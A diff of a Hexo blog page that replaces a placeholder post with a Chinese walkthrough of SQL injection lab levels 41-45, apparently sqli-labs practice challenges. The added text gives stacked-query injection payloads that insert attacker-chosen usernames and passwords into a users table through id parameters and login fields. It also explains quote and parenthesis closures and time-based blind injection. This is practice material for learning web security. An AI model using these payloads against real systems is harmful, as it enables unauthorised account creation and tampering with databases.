@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>test | Hexo</title>
+  <title>sql 41-45关 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="#just for a test##666">
+  <meta name="description" content="sql第四十一关 1.数字型注入，直接id&#x3D;1;insert into users (id,username,password) values (‘41’,’hacked’,’hacked’); –+，输入id&#x3D;41，成功查询两个hacked sql第四十二关 1.出现用户和密码两个框，猜测是自己建立新账户然后登入，发现在密码后面单引号报错，再输入一个#发现不报错，说明是单引号">
 <meta property="og:type" content="article">
-<meta property="og:title" content="test">
-<meta property="og:url" content="http://example.com/2022/12/23/test/index.html">
+<meta property="og:title" content="sql 41-45关">
+<meta property="og:url" content="http://example.com/2023/04/12/sql-41-45%E5%85%B3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="#just for a test##666">
+<meta property="og:description" content="sql第四十一关 1.数字型注入，直接id&#x3D;1;insert into users (id,username,password) values (‘41’,’hacked’,’hacked’); –+，输入id&#x3D;41，成功查询两个hacked sql第四十二关 1.出现用户和密码两个框，猜测是自己建立新账户然后登入，发现在密码后面单引号报错，再输入一个#发现不报错，说明是单引号">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-12-23T09:20:46.000Z">
-<meta property="article:modified_time" content="2022-12-23T14:31:19.665Z">
+<meta property="article:published_time" content="2023-04-12T15:01:26.000Z">
+<meta property="article:modified_time" content="2023-04-12T15:20:28.127Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -73,10 +73,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-sql-41-45关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/12/23/test/" class="article-date">
-  <time class="dt-published" datetime="2022-12-23T09:20:46.000Z" itemprop="datePublished">2022-12-23</time>
+    <a href="/2023/04/12/sql-41-45%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2023-04-12T15:01:26.000Z" itemprop="datePublished">2023-04-12</time>
 </a>
     
   </div>
@@ -87,7 +87,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      test
+      sql 41-45关
     </h1>
   
 
@@ -95,12 +95,23 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>#just for a test<br>##666  </p>
+        <p>sql第四十一关</p>
+<p>1.数字型注入，直接id&#x3D;1;insert into users (id,username,password) values (‘41’,’hacked’,’hacked’); –+，输入id&#x3D;41，成功查询两个hacked</p>
+<p>sql第四十二关</p>
+<p>1.出现用户和密码两个框，猜测是自己建立新账户然后登入，发现在密码后面单引号报错，再输入一个#发现不报错，说明是单引号闭合，直接id&#x3D;1’;insert into users (id,username,password) values (‘42’,’zack’,’zack’); –+</p>
+<p>2.用账号密码登入，显示成功</p>
+<p>sql第四十三关</p>
+<p>1.闭合方式为’)，其它一样的</p>
+<p>sql第四十四关</p>
+<p>1.这关没有报错回显，用时间盲注试一下，单引号闭合，然后注入login_user&#x3D;a&amp;login_password&#x3D;a’;insert into users(id,username,password) values(19,’a’,’a’) –+&amp;mysubmit&#x3D;Login </p>
+<p>2.其它操作同上</p>
+<p>sql第四十五关</p>
+<p>1.闭合方式’)，没有报错信息，还是时间盲注，输入login_user&#x3D;a&amp;login_password&#x3D;a’); insert into users(id,username,password) values(20,’’c’,’c’) –+&amp;mysubmit&#x3D;Log</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/23/test/" data-id="clg3wi6790002awxxdxce0e1x" data-title="test" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/04/12/sql-41-45%E5%85%B3/" data-id="clgdu95ir0000psxx2e3sch8f" data-title="sql 41-45关" class="article-share-link">Share</a>
       
       
       
@@ -110,19 +121,19 @@
     
 <nav id="article-nav">
   
-    <a href="/2023/04/11/sql-26-30%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2023/12/15/sql-11-15%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          sql 26-30关
+          sql 11-15关
         
       </div>
     </a>
   
   
-    <a href="/2022/12/20/sql-31-35%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/04/11/sql-26-30%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sql 31-35关</div>
+      <div class="article-nav-title">sql 26-30关</div>
     </a>
   
 </nav>
